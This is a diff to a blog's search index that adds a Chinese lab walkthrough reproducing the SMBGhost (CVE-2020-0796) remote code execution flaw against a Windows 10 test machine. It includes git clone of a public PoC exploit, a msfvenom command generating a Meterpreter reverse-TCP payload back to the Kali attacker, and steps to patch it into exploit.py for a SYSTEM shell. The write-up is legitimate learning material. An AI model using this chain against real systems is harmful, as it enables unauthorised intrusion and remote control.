@@ -31,13 +31,27 @@
     
     
     <entry>
-      <title>第一篇文章</title>
-      <link href="2020/10/31/search/"/>
-      <url>2020/10/31/search/</url>
+      <title>CVE-2020-0796“永恒之黑”漏洞复现</title>
+      <link href="2020/10/31/CVE-2020-0796%E2%80%9C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E2%80%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+      <url>2020/10/31/CVE-2020-0796%E2%80%9C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E2%80%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h2><p>Microsoft Server Message Block 3.1.1(SMBv3)协议在处理某些请求的方式中存在代码执行漏洞。攻击者可以精心构造数据包发送到SMB服务器，无需经过身份验证，即可在目标服务器上执行任意代码。攻击者可通过部署一台恶意SMB v3服务器，并诱导用户（客户端）连接到该服务器，一旦目标用户连接，即可在计算机上执行攻击者自定义的恶意代码。由于上述漏洞与WannaCry（2017年5月“永恒之蓝”）漏洞较为相似，易被蠕虫利用传播恶意程序，可能会成为恶意软件和攻击者广泛利用的漏洞</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><ul><li>Windows 10 Version 1903 for 32-bit Systems</li><li>Windows 10 Version 1903 for ARM64-based Systems</li><li>Windows 10 Version 1903 for x64-based Systems</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)</li></ul><h2 id="0x02-测试环境"><a href="#0x02-测试环境" class="headerlink" title="0x02 测试环境"></a>0x02 测试环境</h2><p>靶机：cn_windows_10_consumer_editions_version_1903_x64(关闭防火墙)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1uPXjfAYUUaJvZQLNylwBNg  提取码：wkrq</span><br></pre></td></tr></table></figure><p>攻击机：kali 2020.3</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>打开靶机，关闭靶机防火墙<br><img src="/image/image-20201113145930089.png" alt="1"></p><p>打开kali,通过git 命令下载检测漏洞的python脚本<br><img src="/image/image-20201113152431290.png" alt="1"></p><p>利用脚本测试主机是否存在漏洞<br><img src="/image/image-20201113163204329.png" alt="1"><br>如上图显示证明存在漏洞</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>下载漏洞利用脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;chompie1337&#x2F;SMBGhost_RCE_PoC.git</span><br></pre></td></tr></table></figure><p><img src="/image/image-20201113153428205.png" alt="1"></p><p>exploit.py原文件不能直接用来攻击，需要修改其中的USER_PAYLOAD部分</p><p>利用msfvenom生成payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 # lhost为kali的IP，lport为监听端口</span><br><span class="line">2 msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;kali的地址 lport&#x3D;xxxx -b &#39;\x00&#39; -f python</span><br></pre></td></tr></table></figure><p><img src="/image/image-20201113154029001.png" alt="1"></p><p>为了防止操作失误，可以提前将exploit.py原文件文件进行备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp exploit.py exploit.py.bak</span><br></pre></td></tr></table></figure><p><img src="/image/image-20201113154313619.png" alt="1"></p><p>替换payload,将user_payload替换成生成的payload<br>最后一行加上 USER_PAYLOAD = buf 保存并退出</p><p><img src="/image/image-20201113154458905.png" alt="1"><br><img src="/image/image-20201113162050243.png" alt="1"></p><p>在另一个窗口打开MSF开启监听</p><p><img src="/image/image-20201113163518407.png" alt="1"></p><p>执行exploit.py脚本对Win10进行攻击</p><p><img src="/image/image-20201113163832156.png" alt="1"></p><p>再返回查看开启了MSF监听的窗口，已经成功连接（一次不成功可以多试几次）<br><img src="/image/image-20201113163911946.png" alt="1"><br>成功拿到了system权限</p><p>在Win10上查看端口，发现连接<br><img src="/image/image-20201113161527572.png" alt="1"></p>]]></content>
       
       
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CVE-2020-0796 </tag>
+            
+            <tag> 永恒之黑 </tag>
+            
+        </tags>
       
     </entry>
     
